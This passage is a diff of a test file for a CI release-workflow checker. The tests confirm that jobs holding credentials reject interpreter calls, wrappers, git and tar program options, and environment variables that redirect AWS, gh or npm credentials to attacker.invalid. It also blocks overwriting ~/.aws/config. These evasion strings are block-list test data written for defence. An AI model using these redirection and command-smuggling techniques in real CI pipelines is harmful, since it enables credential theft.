@@ -6,6 +6,8 @@ import { parse } from "yaml";
 
 import {
 	ALLOWED_ACTIONS,
+	ALLOWED_COMMANDS,
+	BETA_SIGNATURES,
 	CREDENTIAL_JOBS,
 	HEAD_OBJECT_GUARD,
 	PRODUCTION_POINTERS,
@@ -14,10 +16,14 @@ import {
 	TEST_SIGNER_FLAG,
 	TEST_SIGNER_STEP,
 	artifactDirectoriesOf,
+	casePatternMatches,
+	caseSkipPatternsOf,
 	checkWorkflows,
+	commandAllowlistReasons,
 	credentialStepReasons,
 	headObjectGuardReasons,
 	ignoreScriptsEnabled,
+	isArtifactPath,
 	isCredentialBearing,
 	lifecycleReasons,
 	permissionEntries,
@@ -701,17 +707,21 @@ test("every aws destination in a publish job must be spelled out against the all
 		const { reasons } = r2StepReasons(jobId, script, { ...options, last });
 		assert.deepEqual(reasons, [], `${jobId}: ${script}`);
 	};
-	fine("publish-r2", 'for file in artifacts/*; do\n  name=$(basename "$file")\n  aws s3 cp "$file" "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/${name}" --endpoint-url "$R2_ENDPOINT_URL" --content-type "$(content_type "$name")" --cache-control \'public, max-age=31536000, immutable\' --quiet\ndone');
-	fine("publish-r2", 'for file in artifacts/*; do name=$(basename "$file"); aws s3 cp "$file" "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/${name}"; done');
-	fine("publish-r2", 'aws s3 cp artifacts/SHA256SUMS "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/SHA256SUMS" --quiet');
-	fine("publish-r2", 'aws s3 cp "s3://${R2_BUCKET}/${key}" /tmp/readback.bin --endpoint-url "$R2_ENDPOINT_URL" --quiet');
-	fine("publish-r2", 'aws s3api head-object --bucket "$R2_BUCKET" --key "$key" --endpoint-url "$R2_ENDPOINT_URL" >/tmp/head.json 2>/dev/null');
-	fine("publish-r2", 'aws s3 ls "s3://${R2_BUCKET}/releases/"');
-	fine("publish-beta-r2", 'for file in artifacts/*; do name=$(basename "$file"); aws s3 cp "$file" "s3://${R2_BUCKET}/releases/v${BETA_VERSION}/${name}"; done');
-	fine("publish-beta-r2", 'aws s3 cp artifacts/beta "s3://${R2_BUCKET}/beta" --quiet\naws s3 cp artifacts/beta.json "s3://${R2_BUCKET}/beta.json" --quiet', true);
-	for (const pointer of PRODUCTION_POINTERS) fine("finalize-release", `aws s3 cp artifacts/${pointer} "s3://\${R2_BUCKET}/${pointer}" --cache-control no-cache --quiet`, true);
+	// Every invocation carries --endpoint-url "$R2_ENDPOINT_URL" (round 5, finding 2).
+	const E = '--endpoint-url "$R2_ENDPOINT_URL"';
+	fine("publish-r2", `for file in artifacts/*; do\n  name=$(basename "$file")\n  aws s3 cp "$file" "s3://\${R2_BUCKET}/releases/v\${PRODUCTION_VERSION}/\${name}" ${E} --content-type "$(content_type "$name")" --cache-control 'public, max-age=31536000, immutable' --quiet\ndone`);
+	fine("publish-r2", `for file in artifacts/*; do name=$(basename "$file"); aws s3 cp "$file" "s3://\${R2_BUCKET}/releases/v\${PRODUCTION_VERSION}/\${name}" ${E}; done`);
+	fine("publish-r2", `aws s3 cp artifacts/SHA256SUMS "s3://\${R2_BUCKET}/releases/v\${PRODUCTION_VERSION}/SHA256SUMS" ${E} --quiet`);
+	fine("publish-r2", `aws s3 cp artifacts/SHA256SUMS "s3://\${R2_BUCKET}/releases/v\${PRODUCTION_VERSION}/SHA256SUMS" --endpoint-url "\${R2_ENDPOINT_URL}" --region auto --quiet`);
+	fine("publish-r2", `aws s3 cp artifacts/SHA256SUMS "s3://\${R2_BUCKET}/releases/v\${PRODUCTION_VERSION}/SHA256SUMS" ${E} --region "$AWS_DEFAULT_REGION" --quiet`);
+	fine("publish-r2", `aws s3 cp "s3://\${R2_BUCKET}/\${key}" /tmp/readback.bin ${E} --quiet`);
+	fine("publish-r2", `aws s3api head-object --bucket "$R2_BUCKET" --key "$key" ${E} >/tmp/head.json 2>/dev/null`);
+	fine("publish-r2", `aws s3 ls "s3://\${R2_BUCKET}/releases/" ${E}`);
+	fine("publish-beta-r2", `for file in artifacts/*; do name=$(basename "$file"); aws s3 cp "$file" "s3://\${R2_BUCKET}/releases/v\${BETA_VERSION}/\${name}" ${E}; done`);
+	fine("publish-beta-r2", `aws s3 cp artifacts/beta "s3://\${R2_BUCKET}/beta" ${E} --quiet\naws s3 cp artifacts/beta.json "s3://\${R2_BUCKET}/beta.json" ${E} --quiet`, true);
+	for (const pointer of PRODUCTION_POINTERS) fine("finalize-release", `aws s3 cp artifacts/${pointer} "s3://\${R2_BUCKET}/${pointer}" ${E} --cache-control no-cache --quiet`, true);
 	// The pointer keys fall out of the walk.
-	assert.deepEqual(r2StepReasons("finalize-release", 'aws s3 cp artifacts/stable "s3://${R2_BUCKET}/stable"\naws s3 cp artifacts/latest.json "s3://${R2_BUCKET}/latest.json"', { ...options, last: true }).pointers, ["stable", "latest.json"]);
+	assert.deepEqual(r2StepReasons("finalize-release", `aws s3 cp artifacts/stable "s3://\${R2_BUCKET}/stable" ${E}\naws s3 cp artifacts/latest.json "s3://\${R2_BUCKET}/latest.json" ${E}`, { ...options, last: true }).pointers, ["stable", "latest.json"]);
 	// ...and never in an earlier step.
 	assert.match(r2StepReasons("finalize-release", 'aws s3 cp artifacts/stable "s3://${R2_BUCKET}/stable"', options).reasons.join("\n"), /in its last step; 'stable' is written earlier/);
 	assert.match(r2StepReasons("publish-beta-r2", 'aws s3 cp artifacts/beta "s3://${R2_BUCKET}/beta"', options).reasons.join("\n"), /in its last step; 'beta' is written earlier/);
@@ -1225,4 +1235,446 @@ test("every caller of the standalone workflow - ci.yml included - passes exactly
 	const problems = checkWorkflows(reader({ ".github/workflows/extra.yml": extra }), () => ["build-binaries.yml", "ci.yml", "extra.yml"]);
 	assert.ok(problems.some((problem) => problem.startsWith(".github/workflows/extra.yml: job 'sneaky'") && problem.includes("passes secrets")), problems.join("\n"));
 	assert.ok(problems.some((problem) => problem.startsWith(".github/workflows/extra.yml: job 'sneaky'") && problem.includes("must pass exactly")), problems.join("\n"));
+});
+
+// ---------------------------------------------------------------------------------------------
+// Round 5: an explicit command allowlist next to every credential, the aws endpoint pin, the
+// artifact source path, and the signed beta.
+// ---------------------------------------------------------------------------------------------
+
+/** Every job that holds a credential, including the ones that hold only a write token or OIDC. */
+const ALL_CREDENTIAL_JOBS = ["publish-r2", "finalize-release", "publish-beta-r2", "publish-npm", "tap-bump", "github-release", "github-release-beta", "sign"];
+
+const INTERPRETER_EVASIONS_ROUND_5 = [
+	// The reviewer's case: inline code that spells the checkout path only at run time.
+	["node -e concatenating the checkout path", `node -e "require('./scr'+'ipts/x')"`, /runs node, which is not on the command allowlist/],
+	["node -e", "node -e 'console.log(1)'", /runs node, which is not on the command allowlist/],
+	["node --eval", "node --eval 'console.log(1)'", /runs node, which is not on the command allowlist/],
+	["node -p", "node -p '1 + 1'", /runs node, which is not on the command allowlist/],
+	["node --print", "node --print '1'", /runs node, which is not on the command allowlist/],
+	["node --version", "node --version", /runs node, which is not on the command allowlist/],
+	["nodejs", "nodejs -e 1", /runs nodejs, which is not on the command allowlist/],
+	["python3 -c", "python3 -c 'print(1)'", /runs python3, which is not on the command allowlist/],
+	["python -c", "python -c 'print(1)'", /runs python, which is not on the command allowlist/],
+	["perl -e", "perl -e 'print 1'", /runs perl, which is not on the command allowlist/],
+	["perl -E", "perl -E 'say 1'", /runs perl, which is not on the command allowlist/],
+	["ruby -e", "ruby -e 'puts 1'", /runs ruby, which is not on the command allowlist/],
+	["deno", "deno eval 'console.log(1)'", /runs deno, which is not on the command allowlist/],
+	["bun", "bun -e '1'", /runs bun, which is not on the command allowlist/],
+	["tsx", "tsx -e '1'", /runs tsx, which is not on the command allowlist/],
+	["awk with system()", `awk 'BEGIN{system("id")}'`, /runs awk, which is not on the command allowlist/],
+	["a concatenated interpreter name", `'no'"de" -e 1`, /runs node, which is not on the command allowlist/],
+	["an ANSI-C quoted interpreter name", "$'\\x6eode' -e 1", /runs node, which is not on the command allowlist/],
+	["an escaped interpreter name", "no\\de -e 1", /runs node, which is not on the command allowlist/],
+	["node through env", "env node -e 1", /runs env, a wrapper/],
+	["node through /usr/bin/env", "/usr/bin/env node -e 1", /runs \/usr\/bin\/env through a path/],
+	["node through command", "command node -e 1", /runs command, a wrapper/],
+	["node through sudo", "sudo node -e 1", /runs sudo, a wrapper/],
+	["node through timeout", "timeout 5 node -e 1", /runs timeout, a wrapper/],
+	["node through exec", "exec node -e 1", /runs exec, a wrapper/],
+	["node through nohup", "nohup node -e 1", /runs nohup, a wrapper/],
+	["node through nice", "nice -n 5 node -e 1", /runs nice, a wrapper/],
+	["a path to node", "/usr/local/bin/node -e 1", /runs \/usr\/local\/bin\/node through a path/],
+	["a relative path", "./node -e 1", /runs \.\/node through a path/],
+	["node inside a command substitution", "x=$(node -e 1)", /inside a command substitution: runs node, which is not on the command allowlist/],
+	["node inside a process substitution", "cat <(node -e 1)", /inside a command substitution: runs node/],
+	["node after an assignment prefix", "FOO=1 node -e 1", /runs node, which is not on the command allowlist/],
+	["node after if", "if node -e 1; then echo; fi", /runs node, which is not on the command allowlist/],
+	["node after !", "! node -e 1", /runs node, which is not on the command allowlist/],
+	["node in a pipeline", "echo 1 | node -e 1", /runs node, which is not on the command allowlist/],
+	["node in a subshell", "(node -e 1)", /runs node, which is not on the command allowlist/],
+	["node in a brace group", "{ node -e 1; }", /runs node, which is not on the command allowlist/],
+	["node in a function body", "f() {\n  node -e 1\n}\nf", /runs node, which is not on the command allowlist/],
+	["a command not on any list", "openssl rand -hex 8", /runs openssl, which is not on the command allowlist/],
+	["make", "make publish", /runs make, which is not on the command allowlist/],
+	["docker", "docker run x", /runs docker, which is not on the command allowlist/],
+	["ssh", "ssh host cmd", /runs ssh, which is not on the command allowlist/],
+	["wget", "wget https://example.invalid/x", /runs wget, which is not on the command allowlist/],
+	["find without -exec", "find . -name x", /runs find, which is not on the command allowlist/],
+	["xargs", "echo x | xargs echo", /runs xargs, which is not on the command allowlist/],
+	["eval", "eval 'echo hi'", /runs eval, which is not on the command allowlist/],
+	["source", "source x", /runs source, which is not on the command allowlist/],
+	["trap", "trap 'echo' EXIT", /runs trap, which is not on the command allowlist/],
+	["a function shadowing aws", 'aws() { :; }', /defines a shell function named aws, which would shadow/],
+	["a function shadowing test", 'test() { :; }', /defines a shell function named test, which would shadow/],
+	["a function shadowing cd", 'cd() { :; }', /defines a shell function named cd, which would shadow/],
+	["a function shadowing gh with the function keyword", "function gh { :; }", /defines a shell function named gh, which would shadow/],
+	["a function shadowing node", "node() { :; }", /defines a shell function named node, which would shadow/],
+	["calling a function that was never defined", "rewrite x", /runs rewrite, which is not on the command allowlist/],
+	["gh extension", "gh extension install owner/repo", /gh may only run api, release, pr, repo here/],
+	["gh alias", "gh alias set co '!node scripts/x.mjs'", /gh may only run api, release, pr, repo here/],
+	["gh auth", "gh auth token", /gh may only run api, release, pr, repo here/],
+	["gh config", "gh config set git_protocol ssh", /gh may only run api, release, pr, repo here/],
+	["gh run", "gh run download 1", /gh may only run api, release, pr, repo here/],
+	["gh from an expansion", 'gh "$SUB" x', /gh may only run api, release, pr, repo here/],
+	["gh repo other than clone", "gh repo fork o/r", /gh repo may only clone here/],
+	["gh repo clone passing a git config", 'gh repo clone o/r dir -- -c core.hooksPath=/tmp/h', /gh repo clone may hand git only --depth <n>/],
+	["gh repo clone passing a template", "gh repo clone o/r dir -- --template=/tmp/t --depth 1", /gh repo clone may hand git only --depth <n>/],
+	["gh repo clone with an expanded depth", 'gh repo clone o/r dir -- --depth "$N"', /gh repo clone may hand git only --depth <n>|--depth needs a literal number/],
+	["tar --to-command", "tar --to-command=node -xf artifacts/x.tar.gz", /tar option --to-command=node runs a program/],
+	["tar -I", "tar -I 'node x' -xf artifacts/x.tar.gz", /tar option -I runs a program/],
+	["tar --use-compress-program", "tar --use-compress-program=node -xf artifacts/x.tar.gz", /tar option --use-compress-program=node runs a program/],
+	["tar --checkpoint-action", "tar --checkpoint-action=exec=node -xf artifacts/x.tar.gz", /tar option --checkpoint-action=exec=node runs a program/],
+	["curl without --proto", "curl -fsSL https://example.invalid/x", /curl must pin --proto '=https'/],
+	["curl with the wrong --proto", "curl --proto '=http,https' https://example.invalid/x", /curl must pin --proto '=https'/],
+	["curl with an http URL", "curl --proto '=https' http://example.invalid/x", /curl must fetch https:\/\/ URLs only/],
+	["curl -K", "curl --proto '=https' -K /tmp/curlrc https://example.invalid/x", /curl option -K reads a config/],
+	["curl --config", "curl --proto '=https' --config /tmp/curlrc https://example.invalid/x", /curl option --config reads a config/],
+	["curl -k", "curl --proto '=https' -k https://example.invalid/x", /curl option -k reads a config, weakens TLS/],
+	["curl --insecure", "curl --proto '=https' --insecure https://example.invalid/x", /curl option --insecure/],
+	["curl -O", "curl --proto '=https' -O https://example.invalid/x", /curl option -O/],
+	["curl --proxy", "curl --proto '=https' --proxy http://p https://example.invalid/x", /curl option --proxy/],
+	["curl --resolve", "curl --proto '=https' --resolve example.invalid:443:1.2.3.4 https://example.invalid/x", /curl option --resolve/],
+	["an aws endpoint override in the shell", 'AWS_ENDPOINT_URL=https://attacker.invalid aws s3 ls', /sets AWS_ENDPOINT_URL, which redirects where a credential is sent/],
+	["an aws s3 endpoint override in the shell", 'export AWS_ENDPOINT_URL_S3=https://attacker.invalid', /sets AWS_ENDPOINT_URL_S3, which redirects/],
+	["an aws profile", "AWS_PROFILE=other aws s3 ls", /sets AWS_PROFILE, which redirects/],
+	["an aws config file", 'AWS_CONFIG_FILE=/tmp/config aws s3 ls', /sets AWS_CONFIG_FILE, which redirects/],
+	["an aws credentials file", 'export AWS_SHARED_CREDENTIALS_FILE=/tmp/creds', /sets AWS_SHARED_CREDENTIALS_FILE, which redirects/],
+	["an aws CA bundle", 'AWS_CA_BUNDLE=/tmp/ca.pem aws s3 ls', /sets AWS_CA_BUNDLE, which redirects/],
+	["AWS_REGION", "AWS_REGION=us-east-1 aws s3 ls", /sets AWS_REGION, which redirects/],
+	["a gh host", "GH_HOST=attacker.invalid gh api /user", /sets GH_HOST, which redirects/],
+	["a gh config dir", "export GH_CONFIG_DIR=/tmp/gh", /sets GH_CONFIG_DIR, which redirects/],
+	["a git ssh command", 'GIT_SSH_COMMAND="node x" git -C d push origin x', /sets GIT_SSH_COMMAND, which redirects/],
+	["a git config env", 'GIT_CONFIG_COUNT=1 git -C d diff', /sets GIT_CONFIG_COUNT, which redirects/],
+	["a git external diff", "declare -x GIT_EXTERNAL_DIFF=/tmp/x", /sets GIT_EXTERNAL_DIFF, which redirects/],
+	["an npm config", "NPM_CONFIG_REGISTRY=https://attacker.invalid npm publish x.tgz --ignore-scripts", /sets NPM_CONFIG_REGISTRY, which redirects/],
+	["a lowercase npm config", "npm_config_registry=https://attacker.invalid npm publish x.tgz --ignore-scripts", /sets npm_config_registry, which redirects/],
+	["extra CA certs", "NODE_EXTRA_CA_CERTS=/tmp/ca.pem npm publish x.tgz --ignore-scripts", /sets NODE_EXTRA_CA_CERTS, which redirects/],
+	["SSL_CERT_FILE", "SSL_CERT_FILE=/tmp/ca.pem aws s3 ls", /sets SSL_CERT_FILE, which redirects/],
+	["HOME", "HOME=/tmp/home aws s3 ls", /sets HOME, which redirects/],
+	["HOME read from a file", "read -r HOME < /tmp/x", /sets HOME, which redirects/],
+	["a proxy", "HTTPS_PROXY=http://attacker.invalid aws s3 ls", /sets HTTPS_PROXY, which redirects/],
+	["a cosign trust root", "SIGSTORE_ROOT_FILE=/tmp/root.json cosign verify-blob x", /sets SIGSTORE_ROOT_FILE, which redirects/],
+	["a cosign knob", "COSIGN_EXPERIMENTAL=1 cosign verify-blob x", /sets COSIGN_EXPERIMENTAL, which redirects/],
+	["an env override through env", "env AWS_ENDPOINT_URL=https://attacker.invalid aws s3 ls", /sets AWS_ENDPOINT_URL, which redirects/],
+	["writing the aws config", "printf '[default]\\ncredential_process = node x\\n' > ~/.aws/config", /redirects to a configuration or credential file .*~\/\.aws\/config/],
+	["writing the aws config through $HOME", 'printf x > "$HOME/.aws/config"', /redirects to a configuration or credential file .*\$HOME\/\.aws\/config/],
+	["writing the aws config through ${HOME}", 'cat x > "${HOME}/.aws/credentials"', /redirects to a configuration or credential file/],
+	["writing the aws config with tee", "echo x | tee ~/.aws/config", /names a configuration or credential file .*~\/\.aws\/config/],
+	["writing .npmrc", "echo '//registry.npmjs.org/:_authToken=x' > ~/.npmrc", /redirects to a configuration or credential file/],
+	["writing .gitconfig", 'git -C d -c user.name=x -c user.email=y commit -am x > "$HOME/.gitconfig"', /redirects to a configuration or credential file/],
+	["copying into .config/gh", "cp x ~/.config/gh/hosts.yml", /names a configuration or credential file/],
+	["a relative .aws directory", "mkdir -p .aws && cp x .aws/config", /names a configuration or credential file/],
+	["downloading over the aws config", 'aws s3 cp "s3://${R2_BUCKET}/x" ~/.aws/config --endpoint-url "$R2_ENDPOINT_URL"', /names a configuration or credential file/],
+	["a git upload-pack program", "git -C d ls-remote --upload-pack='node x' origin", /git option --upload-pack=node x names a program/],
+	["a git upload-pack program (-u)", "git -C d ls-remote -u 'node x' origin", /git option -u names a program/],
+	["a git receive-pack program", "git -C d push --receive-pack='node x' origin x", /git option --receive-pack=node x names a program/],
+	["a git exec-path", "git --exec-path=/tmp/x -C d diff", /git may carry only -C <dir> and -c user\.name=/],
+	["a git config other than the identity", "git -C d -c core.hooksPath=/tmp/h commit -am x", /git may carry only -C <dir> and -c user\.name=/],
+	["a git alias that runs code", "git -C d -c alias.diff='!node x' diff", /git may carry only -C <dir> and -c user\.name=/],
+	["a git config from an expansion", 'git -C d -c "$KEY" diff', /git may carry only -C <dir> and -c user\.name=/],
+	["a git subcommand off the list", "git -C d clone https://example.invalid/x", /git may only run symbolic-ref, ls-remote, switch, diff, commit, push/],
+	["git submodule", "git -C d submodule update --init", /git may only run/],
+	["git config", "git -C d config core.hooksPath /tmp/h", /git may only run/],
+	["a git subcommand from an expansion", 'git -C d "$SUB"', /git may only run/],
+	["git --no-verify", "git -C d commit --no-verify -am x", /git option --no-verify names a program/],
+	["git with a work tree", "git -C d --work-tree=/tmp/x diff", /git may carry only -C <dir>/],
+];
+
+test("credential-bearing jobs may run only the allowlisted commands; every interpreter, wrapper and path is refused (round 5, finding 1)", () => {
+	for (const [label, script, pattern] of INTERPRETER_EVASIONS_ROUND_5) {
+		const reasons = credentialStepReasons(script, { artifactDirectories: ["artifacts"], jobId: "tap-bump" });
+		assert.ok(reasons.some((reason) => pattern.test(reason)), `${label}: expected ${pattern}, got:\n${reasons.join("\n")}`);
+	}
+	// The per-job tools are allowed where the job exists to run them and nowhere else.
+	const only = (command, jobs) => {
+		for (const jobId of ALL_CREDENTIAL_JOBS) {
+			const reasons = commandAllowlistReasons([...shellCommands(command)][0], { jobId });
+			if (jobs.includes(jobId)) assert.deepEqual(reasons, [], `${command} in ${jobId}`);
+			else assert.match(reasons.join("\n"), /is not on the command allowlist/, `${command} in ${jobId}`);
+		}
+	};
+	only('aws s3 ls "s3://${R2_BUCKET}/" --endpoint-url "$R2_ENDPOINT_URL"', ["publish-r2", "publish-beta-r2", "finalize-release"]);
+	only("cosign verify-blob --bundle artifacts/SHA256SUMS.sigstore.json artifacts/SHA256SUMS", ["sign", "publish-beta-r2"]);
+	only("syft scan file:x -o spdx-json=x.json", ["sign"]);
+	only("npm publish x.tgz --provenance --access public --ignore-scripts", ["publish-npm"]);
+	only("git -C d diff --quiet", ["tap-bump"]);
+	only("sed -E 's/x/y/' f", ["tap-bump"]);
+	assert.deepEqual(ALLOWED_COMMANDS["*"].filter((name) => /^(node|nodejs|python3?|perl|ruby|bash|sh|zsh|deno|bun|tsx|ts-node|awk|env|sudo|xargs|eval|find|npm|npx|aws|git|sed)$/.test(name)), []);
+	// What the checked-in jobs do is accepted, one construct at a time.
+	const fine = [
+		"set -euo pipefail",
+		'test -n "$R2_BUCKET"',
+		'prefix="releases/v${PRODUCTION_VERSION}"',
+		"content_type() {\n  case \"$1\" in\n    *.tar.gz|*.tgz) echo application/gzip ;;\n    *.json) echo application/json ;;\n    *) echo text/plain ;;\n  esac\n}\nfor file in artifacts/*; do\n  name=$(basename \"$file\")\n  case \"$name\" in\n    stable|latest.json) continue ;;  # channel pointers are not immutable\n  esac\n  echo \"$(content_type \"$name\")\"\ndone",
+		"while IFS=$'\\t' read -r name digest; do\n  test -f \"artifacts/$name\"\n  count=$((count + 1))\ndone < <(jq -r '.[] | [.name, .digest] | @tsv' manifest/github-assets.json)",
+		'[[ "$BUILD_REF" =~ ^[0-9a-f]{40}$ ]] || { echo "BUILD_REF is not a full commit SHA: $BUILD_REF" >&2; exit 1; }',
+		'resolve_tag_commit() {\n  local tag="$1" ref type sha\n  if ! ref=$(gh api "repos/${GITHUB_REPOSITORY}/git/ref/tags/${tag}" 2>/tmp/ref-error); then\n    if grep -q \'HTTP 404\' /tmp/ref-error; then return 0; fi\n    cat /tmp/ref-error >&2\n    return 1\n  fi\n  if [ "$(jq -r .ref <<<"$ref")" != "refs/tags/${tag}" ]; then\n    return 1\n  fi\n  printf \'%s\\n\' "$sha"\n}\ntagged=$(resolve_tag_commit "$TAG")',
+		"gh release edit \"$TAG\" --draft=false --latest",
+		"gh api --method POST \"repos/${GITHUB_REPOSITORY}/git/refs\" -f ref=\"refs/tags/${TAG}\" -f sha=\"$BUILD_REF\" >/dev/null",
+		"gh pr create --repo \"$TAP_REPO\" --head \"$branch\" --base \"$default_branch\" --title \"$title\" --body \"$body\"",
+		'gh repo clone "$TAP_REPO" "$workdir" -- --depth 1',
+		"names=()\nwhile IFS= read -r name; do names+=(\"$name\"); done < <(jq -r '.publishOrder[]' npm-packages/manifest.json)\ntest \"${#names[@]}\" -gt 0",
+		"cmp -s /tmp/current-assets.json /tmp/recorded-assets.json || { diff /tmp/recorded-assets.json /tmp/current-assets.json >&2 || true; exit 1; }",
+		'echo "is_head=false" >> "$GITHUB_OUTPUT"',
+		"printf 'Automated beta build from `%s` (`%s`).\\n' \"$DEFAULT_BRANCH\" \"$BUILD_REF\" > /tmp/beta-release-notes.md",
+		"(cd artifacts && sha256sum --check SHA256SUMS)",
+		"mkdir -p signatures\ncosign sign-blob --yes --bundle signatures/SHA256SUMS.sigstore.json artifacts/SHA256SUMS",
+		"workdir=$(mktemp -d)",
+		'lease=$(git -C "$workdir" ls-remote --heads origin "refs/heads/${branch}" | cut -f1)',
+		'git -C "$workdir" -c user.name=\'prime-agent-release\' -c user.email=\'release@primeintellect.ai\' commit -am "prime-agent ${PRODUCTION_VERSION}"',
+		'git -C "$workdir" push origin "refs/heads/${branch}:refs/heads/${branch}" --force-with-lease="refs/heads/${branch}:${lease}"',
+		'git -C "$workdir" switch -c "$branch"',
+		'rewrite() {\n  sed -E "$1" "$formula" > "$formula.tmp"\n  mv "$formula.tmp" "$formula"\n}\nrewrite "s/x/y/"',
+		"curl --proto '=https' -fsSL --retry 5 -o /tmp/x https://example.invalid/x",
+		"tar -xzf artifacts/x.tar.gz -C /tmp/extracted",
+		"cat <<'EOF' > /tmp/notes.md\nRelease notes for the reviewer\nEOF",
+		"command -v aws",
+		"true\n:\nfalse || exit 1",
+	];
+	for (const script of fine) {
+		// Per-job tools are scoped by `only` above; here every other rule must be silent.
+		assert.deepEqual(credentialStepReasons(script, { artifactDirectories: ["artifacts", "manifest", "npm-packages"], jobId: "tap-bump" }).filter((reason) => !/^runs (aws|cosign|syft|npm), which is not on the command allowlist/.test(reason)), [], script);
+	}
+	// Patterns are data: a `case` arm naming an interpreter is not a call, and a pattern list on
+	// its own line does not start a command.
+	assert.deepEqual([...shellCommands("case \"$x\" in\n  node|python3) echo interpreter ;;\n  *) echo other ;;\nesac")].filter((command) => command.casePattern).map((command) => command.words.map((word) => word.text)), [["node"], ["python3"], ["*"]]);
+	assert.deepEqual(credentialStepReasons("case \"$x\" in\n  node|python3) echo interpreter ;;\n  *) echo other ;;\nesac", { jobId: "publish-r2" }), []);
+	// ...but the body of an arm is a command like any other.
+	assert.match(credentialStepReasons("case \"$x\" in\n  a) node -e 1 ;;\nesac", { jobId: "publish-r2" }).join("\n"), /runs node, which is not on the command allowlist/);
+	assert.match(credentialStepReasons("case \"$x\" in\n  a)\n    node -e 1\n    ;;\nesac", { jobId: "publish-r2" }).join("\n"), /runs node, which is not on the command allowlist/);
+	assert.match(credentialStepReasons("case \"$x\" in a) node -e 1 ;; esac", { jobId: "publish-r2" }).join("\n"), /runs node, which is not on the command allowlist/);
+	// `case X` with `in` on the next line is not recognised, so the pattern reads as a command: fail closed.
+	assert.match(credentialStepReasons("case \"$x\"\nin\n  a) echo ;;\nesac", { jobId: "publish-r2" }).join("\n"), /runs a, which is not on the command allowlist/);
+	// A function is callable once defined; its name may not be an allowlisted command.
+	assert.deepEqual(credentialStepReasons("helper() { echo hi; }\nhelper", { jobId: "publish-r2" }), []);
+	assert.match(credentialStepReasons("helper\nhelper() { echo hi; }", { jobId: "publish-r2" }).join("\n"), /runs helper, which is not on the command allowlist/);
+	// The word splitter marks the definition and the pattern words.
+	assert.deepEqual(splitWords("aws() { command aws \"$@\"; }").commands.map((command) => command.words.map((word) => `${word.text}${word.definesFunction ? "()" : ""}`)), [["aws()"], ["{", "command", "aws", "$@"], ["}"]]);
+	assert.deepEqual([...shellCommands("cat <<EOF\nnot a command\nEOF")].map((command) => [command.words.map((word) => word.text).join(" "), command.heredoc ?? false]), [["cat", false], ["not a command", true]]);
+});
+
+/** The evasions every credential-bearing job is exercised against in the workflow; the full list runs for publish-r2 and tap-bump. */
+const INTERPRETER_SMOKE_ROUND_5 = INTERPRETER_EVASIONS_ROUND_5.filter(([label]) =>
+	/^(node -e concatenating|node -e$|python3 -c|python -c|perl -e|ruby -e|a concatenated interpreter|node through env|a path to node|a function shadowing aws|gh extension|an aws endpoint override in the shell|writing the aws config$|a git upload-pack program$)/.test(label),
+);
+assert.equal(INTERPRETER_SMOKE_ROUND_5.length, 14);
+
+for (const jobId of ALL_CREDENTIAL_JOBS) {
+	test(`no interpreter, wrapper, path or off-list command runs inside credential-bearing job ${jobId} (round 5, finding 1)`, () => {
+		const evasions = jobId === "publish-r2" || jobId === "tap-bump" ? INTERPRETER_EVASIONS_ROUND_5 : INTERPRETER_SMOKE_ROUND_5;
+		for (const [label, script, pattern] of evasions) {
+			const broken = mutate(RELEASE, (text) => appendStep(text, jobId, runStep("Sneak in code", `set -euo pipefail\n${script}`)));
+			const problems = checkWorkflows(reader({ [RELEASE]: broken }));
+			// git and sed are only allowed in tap-bump; elsewhere the whole command is off the list, which is the stronger finding.
+			const accepted = (problem) => pattern.test(problem) || (jobId !== "tap-bump" && /is not on the command allowlist/.test(problem));
+			assert.ok(problems.some((problem) => problem.includes(`'${jobId}'`) && accepted(problem)), `${label} in ${jobId}: expected ${pattern}, got:\n${problems.join("\n")}`);
+		}
+		// The env: form of the same redirections.
+		for (const [name, value] of [["AWS_ENDPOINT_URL", "https://attacker.invalid"], ["AWS_ENDPOINT_URL_S3", "https://attacker.invalid"], ["AWS_PROFILE", "other"], ["AWS_CONFIG_FILE", "/tmp/config"], ["GH_HOST", "attacker.invalid"], ["GIT_SSH_COMMAND", "node x"], ["NPM_CONFIG_REGISTRY", "https://attacker.invalid"], ["HOME", "/tmp/home"], ["SIGSTORE_ROOT_FILE", "/tmp/root.json"]]) {
+			const broken = mutate(RELEASE, (text) => appendStep(text, jobId, `      - name: Redirect\n        env:\n          ${name}: '${value}'\n        run: echo hi\n`));
+			const problems = checkWorkflows(reader({ [RELEASE]: broken }));
+			assert.ok(problems.some((problem) => problem.includes(`'${jobId}'`) && problem.includes(`sets ${name}, which redirects`)), `${name} in ${jobId}:\n${problems.join("\n")}`);
+			const jobLevel = mutate(RELEASE, (text) => {
+				const start = text.indexOf(`\n  ${jobId}:\n`);
+				const stepsAt = text.indexOf("\n    steps:\n", start);
+				return `${text.slice(0, stepsAt)}\n    env:\n      ${name}: '${value}'${text.slice(stepsAt)}`;
+			});
+			// (a second env: block is a YAML duplicate-key error for jobs that already have one; the checker must still refuse, one way or another)
+			assert.throws(() => assert.deepEqual(checkWorkflows(reader({ [RELEASE]: jobLevel })), []), `${name} at job level in ${jobId}`);
+		}
+	});
+}
+
+test("the checked-in credential-bearing jobs use only allowlisted commands, and the allowlist names nothing that runs code", () => {
+	const release = parse(readFileSync(RELEASE, "utf8"));
+	for (const [jobId, job] of Object.entries(release.jobs)) {
+		if (!isCredentialBearing(job)) continue;
+		const artifactDirectories = artifactDirectoriesOf(job);
+		for (const step of job.steps ?? []) {
+			assert.deepEqual(credentialStepReasons(String(step.run ?? ""), { artifactDirectories, jobId }), [], `${jobId}: ${step.name}`);
+		}
+	}
+	for (const jobId of ALL_CREDENTIAL_JOBS) assert.ok(isCredentialBearing(release.jobs[jobId]), jobId);
+	assert.deepEqual(checkWorkflows(), []);
+});
+
+const AWS_ENDPOINT_EVASIONS = [
+	["another endpoint", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --endpoint-url https://attacker.invalid', /--endpoint-url must be exactly "\$R2_ENDPOINT_URL".*never https:\/\/attacker\.invalid/],
+	["another variable", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --endpoint-url "$OTHER_ENDPOINT"', /--endpoint-url must be exactly "\$R2_ENDPOINT_URL".*never \$OTHER_ENDPOINT/],
+	["a literal that spells the variable name", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --endpoint-url \'$R2_ENDPOINT_URL\'', /--endpoint-url must be exactly "\$R2_ENDPOINT_URL"/],
